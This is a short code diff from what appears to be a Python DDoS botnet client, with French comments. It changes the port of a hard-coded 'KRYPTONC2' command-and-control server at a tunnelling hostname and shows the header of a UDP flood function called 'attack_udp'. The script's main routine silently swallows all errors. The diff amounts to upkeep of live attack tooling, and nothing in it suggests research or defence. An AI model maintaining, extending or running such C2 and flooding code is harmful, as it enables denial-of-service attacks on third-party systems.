@@ -12,7 +12,7 @@ import sys
 
 # Configuration du serveur C2
 KRYPTONC2_ADDRESS = "nlzpsjlvr.localto.net"
-KRYPTONC2_PORT = 5941
+KRYPTONC2_PORT = 2353
 
 def attack_udp(ip, port, secs, size):
     """Attaque UDP simplifiée"""
@@ -137,5 +137,6 @@ if __name__ == '__main__':
         main()
     except:
         pass
+
 
 
